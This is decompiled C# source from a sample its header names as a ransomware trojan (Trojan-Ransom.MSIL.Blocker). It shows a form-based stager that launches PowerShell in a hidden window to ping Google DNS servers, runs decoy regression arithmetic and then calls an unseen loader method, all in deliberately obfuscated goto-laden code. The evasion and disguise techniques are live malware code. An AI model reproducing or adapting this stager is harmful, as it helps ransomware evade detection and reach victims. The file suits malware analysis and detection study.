// Decompiled with JetBrains decompiler
// Type: Yntmgnmjwxmbnwlr.g
// Assembly: ConsoleApp2, Version=92.0.4515.159, Culture=neutral, PublicKeyToken=null
// MVID: D38653D3-F867-445C-918F-B56DE6FC8054
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-05c81dca5026782b10339282d62291ee4153d1e4952c6062be97481849ac1d2a.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

namespace Yntmgnmjwxmbnwlr
{
  public sealed class g : Form
  {
    private IContainer a;
    private CheckBox b;

    public g()
    {
      if (false)
        return;
      this.a();
    }

    private double a(SortedList<int, int> a)
    {
      if (true)
        goto label_4;
label_1:
      if (true)
        goto label_5;
label_2:
      double num1 = a.Keys.Average();
      if (true)
        goto label_6;
label_3:
      double num2 = a.Values.Average();
      double num3;
      double num4;
      double num5;
      for (int index = 0; index < a.Count; ++index)
      {
        num3 += ((double) a.Keys[index] - num5) * ((double) a.Values[index] - num2);
        num4 += Math.Pow((double) a.Keys[index] - num5, 2.0);
      }
      return num3 / num4;
label_6:
      num5 = num1;
      goto label_3;
label_5:
      num4 = 0.0;
      goto label_2;
label_4:
      num3 = 0.0;
      goto label_1;
    }

    private void a(object a, EventArgs b)
    {
      int num1;
      if (true)
        num1 = 0;
      while (num1 < 5)
      {
        Process.Start(new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Test-Connection 8.8.8.8, 8.8.4.4, time.google.com",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }).WaitForExit(5000);
        int num2 = num1 + 1;
        if (true)
          num1 = num2;
      }
      try
      {
        SortedList<int, int> sortedList = new SortedList<int, int>();
        sortedList.Add(0, 0);
        sortedList.Add(30, 35);
        sortedList.Add(70, 90);
        sortedList.Add(100, 130);
        if (true)
          goto label_7;
label_6:
        List<int> source = new List<int>();
        source.Add(10);
        source.Add(20);
        source.Add(40);
        source.Add(50);
        source.Add(60);
        source.Add(80);
        source.Add(190);
        SortedList<int, int> a1;
        if (source.Max() >= a1.Keys.Max())
          throw new Exception("The maximum value of the forecast points must be lower!");
        if (source.Min() <= a1.Keys.Min())
          throw new Exception("The minimum value of the forecast points must be higher!");
        double num3 = a1.Keys.Average();
        if (true)
          goto label_14;
label_12:
        double num4 = a1.Values.Average();
        if (true)
          goto label_15;
label_13:
        double num5 = this.a(a1);
        double num6;
        double num7;
        foreach (int key in source)
        {
          double a2 = num7 - num5 * num6 + num5 * (double) key;
          a1.Add(key, (int) Math.Round(a2));
        }
        Console.WriteLine("\t-KEY-\t-VALUE-");
        using (IEnumerator<KeyValuePair<int, int>> enumerator = a1.GetEnumerator())
        {
          while (enumerator.MoveNext())
          {
            KeyValuePair<int, int> current = enumerator.Current;
            Console.WriteLine("\t{0}:\t{1}", (object) current.Key, (object) current.Value);
          }
          goto label_28;
        }
label_15:
        num7 = num4;
        goto label_13;
label_14:
        num6 = num3;
        goto label_12;
label_7:
        a1 = sortedList;
        goto label_6;
      }
      catch
      {
      }
label_28:
      i.a();
      this.b.Checked = true;
    }

    private void b(object a, EventArgs b)
    {
      string str1 = i.a();
      if (true)
        goto label_2;
label_1:
      string str2;
      this.Text = str2;
      return;
label_2:
      str2 = str1;
      goto label_1;
    }

    protected override void Dispose(bool a)
    {
      if (a && this.a != null)
        this.a.Dispose();
      int num = a ? 1 : 0;
      if (false)
        return;
      base.Dispose(num != 0);
    }

    private void a()
    {
      CheckBox checkBox = new CheckBox();
      if (true)
        goto label_4;
label_1:
      if (true)
        goto label_5;
label_2:
      this.b.AutoSize = true;
      this.b.Location = new Point(375, 217);
      this.b.Name = "checkBox1";
      this.b.Size = new Size(50, 17);
      this.b.TabIndex = 1;
      this.b.Text = "open";
      this.b.UseVisualStyleBackColor = true;
      this.b.CheckedChanged += new EventHandler(this.b);
      SizeF sizeF = new SizeF(6f, 13f);
      if (true)
        goto label_6;
label_3:
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(800, 450);
      this.Controls.Add((Control) this.b);
      this.Name = "Form2";
      this.Text = "Form2";
      this.Load += new EventHandler(this.a);
      this.ResumeLayout(false);
      this.PerformLayout();
      return;
label_6:
      this.AutoScaleDimensions = sizeF;
      goto label_3;
label_5:
      this.SuspendLayout();
      goto label_2;
label_4:
      this.b = checkBox;
      goto label_1;
    }
  }
}
